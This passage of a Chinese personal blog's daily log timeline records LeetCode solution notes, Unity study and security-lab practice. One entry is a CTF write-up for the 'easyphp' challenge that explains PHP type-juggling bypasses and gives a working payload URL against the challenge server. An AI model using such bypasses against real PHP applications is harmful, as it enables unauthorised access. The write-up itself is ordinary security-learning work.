fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-6"><a href="#2023-9-6" class="headerlink" title="2023-9-6"></a>2023-9-6</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-6"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-6-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-6-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-6-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-6-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-6-1"><p>安全靶场训练。</p><p>Unity：状态机学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-6-2"><p><a href="https://leetcode.cn/problems/lowest-common-ancestor-of-deepest-leaves/">1123. 最深叶节点的最近公共祖先</a></p><p>C#：深度优先搜索。设置maxDpeth和res为类变量。定义<code>public int dfs(int depth, TreeNode node)</code>，在<code>LcaDeepestLeaves()</code>中线初始化maxDepth = -1和res。然后调用dfs，最后返回res作为结果即可。</p><p>在dfs中，先判断node是否为空，为空则更新maxDepth，并且返回当前depth，否则对当前node的左右节点做dfs，记录分别最大深度值。如果左最大深度等于右最大深度等于全局最大深度，更新res = node，最后返回左最大深度和右最大深度中较大的。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-6-3"><p>Web——easyphp</p><p>存入CTF例题中。</p><p>a：利用科学计数法，例如a=1e8。</p><p>b：直接写个for循环暴力搜索。最后找到b=53724。</p><p>c：首先c有m，n两个键，所以是索引数组m和n。因为m要非数字且大于2022，所以可以让m=2044a，字符串和数字组合，两个条件都满足。因为Count(n)为2，所以还要创建一个数组。n[0]存在，任意复制。后面看似”DGGJ”既要存于数组中又不要存于数组中，实则由于array_search查找是通过if进行比较。当一个字符串和一整数比较时会将字符串向整数转化。所以只需填入0两者便会相等。</p><p>最后Payload：<code>http://61.147.171.105:55516?a=1e8&amp;b=53724&amp;c={&quot;m&quot;:&quot;2044a&quot;,&quot;n&quot;:[[&quot;1&quot;],0]}</code></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-6-4"><p>pikachu：目录遍历。</p><p>python爬虫：结构更新。</p><p>CTF例题：easyphp。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-5"><a href="#2023-9-5" class="headerlink" title="2023-9-5"></a>2023-9-5</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-5"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-5-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-5-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-9-5-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-5-1"><p>安全靶场训练。</p><p>Unity：2D游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-5-2"><p><a href="https://leetcode.cn/problems/form-smallest-number-from-two-digit-arrays/">2605. 从两个数字数组里生成最小数字</a></p><p>C#思路：哈希表。先遍历num1和num2，记录下数字是否出现到各自的新数组中，数组长度为10。然后再进行依次遍历，i = 10，先判断num1和num2是否都出现了同一个数字，出现了则直接返回该数字。否则分别记录下num1和num2的最小值，返回他们组合后的最小值。</p><p>时间：<script type="math/tex">O(m+n+C)</script>，C = 10</p><p>空间：<script type="math/tex">O(C)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-5-3"><p>pikachu：越权访问。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-4"><a href="#2023-9-4" class="headerlink" title="2023-9-4"></a>2023-9-4</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-4-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-4-2">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-4-1"><p>安全靶场训练。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-4-2"><p>DVWA：暴力破解。</p><p>pikachu：暴力破解。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-3"><a href="#2023-9-3" class="headerlink" title="2023-9-3"></a>2023-9-3</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-3"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-3-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-3-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-2"><a href="#2023-9-2" class="headerlink" title="2023-9-2"></a>2023-9-2</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-2"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-2-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-2-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-2-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-2-2"><p><a href="https://leetcode.cn/problems/maximum-enemy-forts-that-can-be-captured/">2511. 最多可以摧毁的敌人城堡数目</a></p><p>python3思路：遍历。设置当前值now和索引idx。一个for。当forts[i]的值为1或-1时进行判断。如果值等于-now，就<code>res = max(i - idx - 1,res)</code>并且更新now值，否则只需更新now值。返回res。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-9-1"><a href="#2023-9-1" class="headerlink" title="2023-9-1"></a>2023-9-1</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-9-1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-9-1-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-9-1-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-9-1-1"><p>编写密码器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-9-1-2"><p><a href="https://leetcode.cn/problems/number-of-ways-to-buy-pens-and-pencils/">2240. 买钢笔和铅笔的方案数</a></p><p>python3思路：直接遍历。找到cost中的大值和小值。设置一个while循环，当大值所选花销小于等于total时循环，每次累加的结果值为剩余的钱整除小值后的钱再加1，然后大值所选个数加1。最后返回结果。</p><p>时间：<script type="math/tex">O(⌊total / max(cost1, cost2)⌋)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div></div><div class="timeline  blue"><div class="timeline-item headline"><div class="timeline-item-title"><div class="item-circle"><h2 id="2023-8"><a href="#2023-8" class="headerlink" title="2023-8"></a>2023-8</h2></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-31"><a href="#2023-8-31" class="headerlink" title="2023-8-31"></a>2023-8-31</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-31"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-31-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-31-1"><p>编写密码器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-30"><a href="#2023-8-30" class="headerlink" title="2023-8-30"></a>2023-8-30</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-30"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-30-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-30-1"><p>编写密码器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-28"><a href="#2023-8-28" class="headerlink" title="2023-8-28"></a>2023-8-28</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-28"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-28-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-28-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-28-1"><p>编写密码器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-28-2"><p><a href="https://leetcode.cn/problems/insert-interval/">57. 插入区间</a></p><p>同理昨天</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-27"><a href="#2023-8-27" class="headerlink" title="2023-8-27"></a>2023-8-27</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-27"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-27-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-27-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-27-1"><p>编写密码器。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-27-2"><p><a href="https://leetcode.cn/problems/merge-intervals/">56. 合并区间</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-26"><a href="#2023-8-26" class="headerlink" title="2023-8-26"></a>2023-8-26</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-26"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-26-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-26-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-26-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-26-2"><p><a href="https://leetcode.cn/problems/summary-ranges/">228. 汇总区间</a></p><p>python3思路：遍历。先判断nums长度0和1的情况，然后for循环。记下首尾两个数。每次判断nums当前数字是否等于应该出现的尾数。不等于则根据首尾数差判断加入到Output中的样式。等于则尾数+1。结束后再判断一次首尾数字。返回结果。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-25"><a href="#2023-8-25" class="headerlink" title="2023-8-25"></a>2023-8-25</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-25"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-25-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-25-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-25-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-25-2"><p><a href="https://leetcode.cn/problems/count-good-nodes-in-binary-tree/">1448. 统计二叉树中好节点的数目</a></p><p>python3思路：DFS。记录路径下的最大值，然后向下传。满足条件将res++并更新路径中的最大值。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-24"><a href="#2023-8-24" class="headerlink" title="2023-8-24"></a>2023-8-24</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-24"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-24-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-24-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-24-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-24-2"><p><a href="https://leetcode.cn/problems/count-servers-that-communicate/">1267. 统计参与通信的服务器</a></p><p>python3思路：直接遍历。先两个for遍历出每行每列有多少台服务器，存入字典中。然后再两个for遍历，当某个位置存在服务器且该行或该列的服务器数量大于1时，总数加一。返回总数。</p><p>时间：<script type="math/tex">O(mn)</script></p><p>空间：<script type="math/tex">O(m+n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-22"><a href="#2023-8-22" class="headerlink" title="2023-8-22"></a>2023-8-22</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-22"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-22-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-22-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-22-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-22-2"><p><a href="https://leetcode.cn/problems/maximize-distance-to-closest-person/">849. 到最近的人的最大距离</a></p><p>python3思路：双指针。分三段，先一个for找到第一个人的位置，此时最大距离是最左边到第一个人的位置，然后左指针指向他。之后再一个for，找到人后先右指针指向他，最大距离就是左右指针距离差的一半再向下取整。然后左指针指向右指针。结束后，再判断一下最后一个座位是否为空。是的话此时最大距离是最后一个位置到左指针的距离。最后返回其中的最大的一个距离。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-21"><a href="#2023-8-21" class="headerlink" title="2023-8-21"></a>2023-8-21</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-21"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-21-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-21-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-21-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-21-2"><p><a href="https://leetcode.cn/problems/move-pieces-to-obtain-a-string/">2337. 移动片段得到字符串</a></p><p>python3思路：双指针。先用replace将”_”替换成””判断两个字符串是否相等，如果不相等直接返回False。然后在设置lp指向start头，rp指向target头。当lp未越界时，判断lp和rp指向L时是否lp&lt;=rp，指向R时是否lp&gt;=rp，全满足就返回True，有一个不满足就返回False。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-20"><a href="#2023-8-20" class="headerlink" title="2023-8-20"></a>2023-8-20</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-20"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-20-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-20-1"><p>休息。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-19"><a href="#2023-8-19" class="headerlink" title="2023-8-19"></a>2023-8-19</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-19"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-19-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-19-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-19-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-19-2"><p><a href="https://leetcode.cn/problems/add-two-integers/">2235. 两整数相加</a></p><p>直接相加。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-18"><a href="#2023-8-18" class="headerlink" title="2023-8-18"></a>2023-8-18</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-18"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-18-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-18-1"><p>Unity：2D游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-17"><a href="#2023-8-17" class="headerlink" title="2023-8-17"></a>2023-8-17</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-17"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-17-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-17-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-16"><a href="#2023-8-16" class="headerlink" title="2023-8-16"></a>2023-8-16</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-16"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-16-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-16-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-16-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-16-2"><p><a href="https://leetcode.cn/problems/find-the-losers-of-the-circular-game/">2682. 找出转圈游戏输家</a></p><p>python3思路：模拟。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-15"><a href="#2023-8-15" class="headerlink" title="2023-8-15"></a>2023-8-15</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-15"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-15-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-15-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-15-1"><p>Unity：2D游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-15-2"><p><a href="https://leetcode.cn/problems/find-and-replace-in-string/">833. 字符串中的查找与替换</a></p><p>python3思路：哈希表。建立字典，找到indices的值作为键，索引作为值。然后给键从小到大排序、之后对其进行一个for循环。设立一个当前位置nxt和一个res列表。每次先把从nxt到当前索引的位置的字符加入到res中。然后判断是否需要替换，加入对应的字符串并更新nxt的位置。最后将res拼接成字符串输出。</p><p>时间：<script type="math/tex">O(nlogn)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-14"><a href="#2023-8-14" class="headerlink" title="2023-8-14"></a>2023-8-14</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-14"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-14-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-14-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-14-1"><p>Unity：寻路系统。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-14-2"><p><a href="https://leetcode.cn/problems/merge-two-binary-trees/">617. 合并二叉树</a></p><p>C#思路：参考评论区。递归。如果root1为空返回root2，如果root2为空返回root1。否则返回一个新节点，节点值为两者之和，左节点为MergeTrees两者的左节点，右节点同理。</p><p>时间：<script type="math/tex">O(min(m,n))</script></p><p>空间：<script type="math/tex">O(min(m,n))</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-13"><a href="#2023-8-13" class="headerlink" title="2023-8-13"></a>2023-8-13</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-13"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-13-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-13-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-13-1"><p>Unity：寻路系统。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-13-2"><p><a href="https://leetcode.cn/problems/merge-sorted-array/">88. 合并两个有序数组</a></p><p>C#思路：参考评论区。反向双指针。设三个指针p1,p2分别指向num1的m-1，nums2的n-1，p指向m+n-1。因为数组有序。所以一个while循环，每次比较p1,和p2的元素大小，将较大的放入p的位置。然后将p1或p2（较大的）减一，p减一。结束条件是p2 &lt; 0。因为数组有序，所以p2 &lt; 0即可，剩下的p1的元素也是有序的。</p><p>时间：<script type="math/tex">O(m+n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-12"><a href="#2023-8-12" class="headerlink" title="2023-8-12"></a>2023-8-12</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-12"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-12-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-12-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-8-12-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-12-1"><p>Unity：寻路系统。</p><p>更改关于中的文章的时间顺序。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-12-2"><p><a href="https://leetcode.cn/problems/merge-k-sorted-lists/">23. 合并 K 个升序链表</a></p><p>python3思路：先一个for，找到链表中的val值作为键，在lists中的index值作为值存入字典。字典值是一个列表。之后给字典的键进行从小到大排序。设置好头结点。然后再两个for，每次找到最小键的最小值，该索引对应的链表值就是需要的值。依次往头结点上进行拼接。最后返回头结点。</p><p>时间：<script type="math/tex">O(nlogn)</script>，n为链表节点数总数。</p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-12-3"><p>日志：每日日志由2023-5 / 6 / 7 / 8四个网页合成成一个。同时修改日志的时间顺序为降序。 </p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-11"><a href="#2023-8-11" class="headerlink" title="2023-8-11"></a>2023-8-11</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-11"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-11-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-11-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-11-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-11-2"><p><a href="https://leetcode.cn/problems/matrix-diagonal-sum/">1572. 矩阵对角线元素的和</a></p><p>C#思路：一个for遍历，每次加上左上到右下，左下到右上的同一列的两个数。最后判断mat的长度，如果是奇数再减去重复的中心的值。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-10"><a href="#2023-8-10" class="headerlink" title="2023-8-10"></a>2023-8-10</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-10"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-10-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-10-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-10-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-10-2"><p><a href="https://leetcode.cn/problems/minimum-falling-path-sum-ii/">1289. 下降路径最小和 II</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-9"><a href="#2023-8-9" class="headerlink" title="2023-8-9"></a>2023-8-9</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-9"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-9-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-9-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-9-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-9-2"><p><a href="https://leetcode.cn/problems/subtract-the-product-and-sum-of-digits-of-an-integer/">1281. 整数的各位积和之差</a></p><p>python3思路：模拟。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-8"><a href="#2023-8-8" class="headerlink" title="2023-8-8"></a>2023-8-8</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-8"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-8-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-8-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-8-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-8-8-2"><p><a href="https://leetcode.cn/problems/maximum-absolute-sum-of-any-subarray/">1749. 任意子数组和的绝对值的最大值</a></p><p>C#思路：前缀和。参考题解。找到前缀和中的最大值和最小值，两者相减取绝对值就是子数组的最大值。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-8-7"><a href="#2023-8-7" class="headerlink" title="2023-8-7"></a>2023-8-7</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-8-7"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-8-7-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-8-7-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-8-7-1"><p>Unity：2D小游戏学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" 